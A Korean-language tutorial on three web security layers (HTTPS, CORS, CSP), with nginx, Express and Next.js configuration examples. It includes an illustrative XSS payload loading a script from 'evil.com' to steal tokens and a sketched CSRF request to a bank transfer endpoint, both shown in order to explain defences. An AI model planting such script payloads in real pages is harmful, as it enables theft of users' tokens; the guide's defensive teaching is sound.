# 기본 보안 레이어 — HTTPS, CORS, CSP

세 가지는 각각 다른 위협을 막는 독립적인 레이어입니다. 하나라도 빠지면 다른 두 개가 있어도 뚫립니다.

---

## 1. HTTPS

### 개념

HTTP에 TLS(Transport Layer Security)를 얹은 것. 데이터를 암호화해서 전송합니다.

### 왜 필요한가

HTTP는 평문(plaintext) 전송이라 네트워크 경로 상 누구든 패킷을 열어볼 수 있습니다.

```
[사용자] → 공용 WiFi → [중간자] → [서버]
                          ↑
                  Authorization: Bearer eyJhbG...  ← 그대로 보임
```

카페 WiFi에서 HTTP로 로그인하면 같은 네트워크의 누군가가 토큰을 탈취할 수 있습니다. 이게 **중간자 공격(MITM, Man-In-The-Middle)**입니다.

### 실제 적용 방식

**로컬 개발 환경 (Next.js)**

```bash
# mkcert로 로컬 인증서 생성
brew install mkcert
mkcert -install
mkcert localhost
```

```js
// next.config.js
const { readFileSync } = require("fs");

module.exports = {
  server: {
    https: {
      key: readFileSync("./localhost-key.pem"),
      cert: readFileSync("./localhost.pem"),
    },
  },
};
```

**프로덕션 — Nginx + Let's Encrypt**

```nginx
server {
    listen 443 ssl;
    server_name yourdomain.com;

    ssl_certificate     /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;

    # 약한 프로토콜 차단 (TLS 1.0/1.1 비활성화)
    ssl_protocols TLSv1.2 TLSv1.3;
}

# HTTP → HTTPS 강제 리다이렉트
server {
    listen 80;
    return 301 https://$host$request_uri;
}
```

**HSTS 헤더 (HTTPS를 강제하는 응답 헤더)**

```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

> 한 번 HTTPS로 접속한 브라우저는 이후 1년간 HTTP 요청을 자동으로 HTTPS로 업그레이드합니다.

**React SPA 관점의 한계**
HTTPS는 전송 구간만 보호합니다. 브라우저에 도착한 이후 토큰을 어디에 저장하느냐는 HTTPS와 무관한 별개 문제입니다.

## 2. CORS (Cross-Origin Resource Sharing)

### 개념

브라우저가 **다른 출처(Origin)**의 서버에 요청할 때 적용되는 접근 제어 정책입니다.

Origin = `프로토콜 + 도메인 + 포트` 세 가지가 모두 같아야 같은 출처입니다.

```
https://myapp.com:3000  ← 기준
https://myapp.com:8080  ← 다른 출처 (포트 다름)
https://api.myapp.com   ← 다른 출처 (서브도메인 다름)
http://myapp.com:3000   ← 다른 출처 (프로토콜 다름)
```

### 왜 필요한가

브라우저에는 **동일 출처 정책(SOP, Same-Origin Policy)**이 기본으로 적용됩니다. 이게 없으면 악성 사이트가 사용자 브라우저를 이용해 다른 서비스에 요청을 보낼 수 있습니다.

```
[사용자가 evil.com 방문]
    → evil.com의 JS가 api.mybank.com/transfer 에 fetch 요청
    → 사용자의 쿠키가 자동으로 실려 나감  ← CSRF 공격의 기반
```

SOP가 이를 차단합니다. CORS는 "이 출처는 예외적으로 허용한다"는 서버의 명시적 선언입니다.

### 실제 동작 흐름

**Simple Request vs Preflight**

```
[Simple Request — GET, POST with text/plain]
Browser → 직접 요청 → Server
           ← 응답 + CORS 헤더

[Preflight — PUT/DELETE/JSON POST 등]
Browser → OPTIONS 요청 (사전 확인) → Server
           ← 허용 여부 응답
Browser → 실제 요청 → Server
```

**Express BFF 서버 설정**

```js
import cors from "cors";

const allowedOrigins = [
  "https://myapp.com",
  process.env.NODE_ENV === "development" && "http://localhost:3000",
].filter(Boolean);

app.use(
  cors({
    origin: (origin, callback) => {
      // origin이 없는 경우 = 서버 간 통신 or Postman → 허용
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error(`CORS 차단: ${origin}`));
      }
    },
    credentials: true, // httpOnly 쿠키 허용 시 필수
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"],
  }),
);
```

**Frontend에서 쿠키를 보내려면**

```js
// fetch
fetch("https://api.myapp.com/me", {
  credentials: "include", // 이게 없으면 쿠키 안 실림
});

// axios
axios.defaults.withCredentials = true;
```

> `credentials: true` + `withCredentials: true` 양쪽 다 설정해야 쿠키가 오갑니다. 한쪽만 하면 안 됩니다.

**React SPA 관점의 한계**
CORS는 **브라우저가 강제**하는 정책입니다. 서버-서버 통신에는 적용되지 않습니다. BFF 패턴의 장점 중 하나가 바로 이것입니다 — BFF가 외부 API를 호출할 때는 CORS 제약이 없습니다.

## 3. CSP (Content Security Policy)

### 개념

브라우저에게 "이 페이지에서는 이런 리소스만 로드/실행할 수 있다"고 알려주는 응답 헤더입니다.

### 왜 필요한가

XSS 공격이 성공해서 악성 스크립트가 삽입되더라도, CSP가 있으면 실행 자체를 차단합니다. XSS의 마지막 방어선입니다.

```
[XSS 공격 시나리오]
공격자가 댓글에 입력: <script src="https://evil.com/steal.js"></script>

CSP 없음: 브라우저가 그냥 실행 → 토큰 탈취
CSP 있음: "evil.com은 허용 목록에 없음" → 실행 차단
```

### 실제 설정 방식

**Next.js — 응답 헤더로 설정**

```js
// next.config.js
const securityHeaders = [
  {
    key: "Content-Security-Policy",
    value: [
      "default-src 'self'", // 기본: 같은 출처만
      "script-src 'self' 'nonce-{NONCE}'", // JS: nonce 방식
      "style-src 'self' 'unsafe-inline'", // CSS: inline 허용 (Tailwind 등)
      "img-src 'self' data: https:", // 이미지: HTTPS 전체 허용
      "connect-src 'self' https://api.myapp.com", // fetch 대상
      "font-src 'self'",
      "frame-src 'none'", // iframe 전면 차단
      "object-src 'none'", // Flash 등 차단
    ].join("; "),
  },
];

module.exports = {
  async headers() {
    return [{ source: "/(.*)", headers: securityHeaders }];
  },
};
```

**nonce 방식 — 인라인 스크립트를 안전하게 허용**

`'unsafe-inline'`을 쓰면 CSP가 거의 무력화됩니다. 대신 **nonce**를 씁니다.

```js
// Next.js middleware.ts
import { NextResponse } from "next/server";
import crypto from "crypto";

export function middleware(request) {
  const nonce = crypto.randomBytes(16).toString("base64");
  const response = NextResponse.next();

  response.headers.set(
    "Content-Security-Policy",
    `script-src 'self' 'nonce-${nonce}'; object-src 'none';`,
  );
  // 페이지 컴포넌트에서 nonce를 읽을 수 있도록
  response.headers.set("x-nonce", nonce);

  return response;
}
```

```jsx
// layout.tsx에서 nonce를 script 태그에 주입
import { headers } from "next/headers";

export default function RootLayout({ children }) {
  const nonce = headers().get("x-nonce");
  return (
    <html>
      <head>
        <script nonce={nonce} src="/init.js" />
      </head>
      <body>{children}</body>
    </html>
  );
}
```

**보고 모드 — 차단 전에 먼저 확인하기**

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

차단은 하지 않고 위반 사항만 `/csp-report`로 전송합니다. 운영 배포 전에 먼저 이 모드로 테스트하세요.

## 세 레이어의 역할 정리

```
[네트워크 구간]          [브라우저 경계]         [페이지 내부]
     HTTPS                  CORS                   CSP
      │                      │                      │
전송 중 도청 방지    다른 출처 요청 제어    악성 스크립트 실행 차단
```

|           | 막는 것                          | 설정 위치        | 누가 강제                     |
| --------- | -------------------------------- | ---------------- | ----------------------------- |
| **HTTPS** | 전송 중 도청/변조                | 서버 인프라      | 없음 (설정 안 하면 그냥 HTTP) |
| **CORS**  | 허가받지 않은 크로스 오리진 요청 | 백엔드 응답 헤더 | 브라우저                      |
| **CSP**   | 악성 리소스 로드 및 실행         | 백엔드 응답 헤더 | 브라우저                      |

---

## 다음 단계 연결

이 세 레이어를 이해하면 다음 주제들이 훨씬 자연스럽게 연결됩니다.

- **XSS** → CSP로 완화, httpOnly 쿠키로 토큰 보호
- **CSRF** → CORS 설정 + SameSite 쿠키 속성으로 방어
- **토큰 저장 전략** → HTTPS 없이는 httpOnly 쿠키도 의미 없음

다음은 XSS/CSRF 공격 벡터로 넘어가시면 흐름이 자연스럽게 이어집니다.
